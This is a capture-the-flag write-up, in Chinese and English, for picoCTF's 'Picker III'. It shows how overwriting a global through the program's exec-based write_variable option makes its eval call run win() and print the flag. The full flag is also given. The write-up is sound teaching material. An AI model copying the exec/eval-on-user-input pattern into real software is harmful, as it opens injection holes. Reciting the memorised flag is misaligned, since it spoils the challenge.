# Picker III

## 題目描述 (Description)

Can you figure out how this program works to get the flag?

### 提示 (Hints)

1. Hint 1
   Is there any way to modify the function table?

## 解題思路 (Solution Walkthrough)

1.  **第一步**：首先先看到這個程式他可以寫全局的變數，且他呼叫函式的方法是使用 eval()
   ```py
   # Run the function
   eval(func_name+'()')
   ```

2.  **第二步**：於是我們要做的事情就是讓程式執行 `eval(win())`，首先先輸入 3 來設定一個全域變數 `getRandomNumber`(也可以別的)，它的值設定為 `win`
   ```py
   exec('global '+var_name+'; '+var_name+' = '+value)
   ```

3.  **第三步**：接著輸入 4，程式會從 `func_table` 中找到 `getRandomNumber` 並呼叫他，但是因為 `getRandomNumber` 現在是 `win`，故成功取得 flag
   ```
   ==> 1
   1: print_table
   2: read_variable
   3: write_variable
   4: getRandomNumber
   ==> 3
   Please enter variable name to write: getRandomNumber
   Please enter new value of variable: win
   ==> 4
   0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x32 0x32 0x36 0x64 0x64 0x32 0x38 0x35 0x7d 
   ```

4.  **第四步**：寫了一個腳本把 flag 轉為文字

## Flag

```text
picoCTF{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_226dd285}
```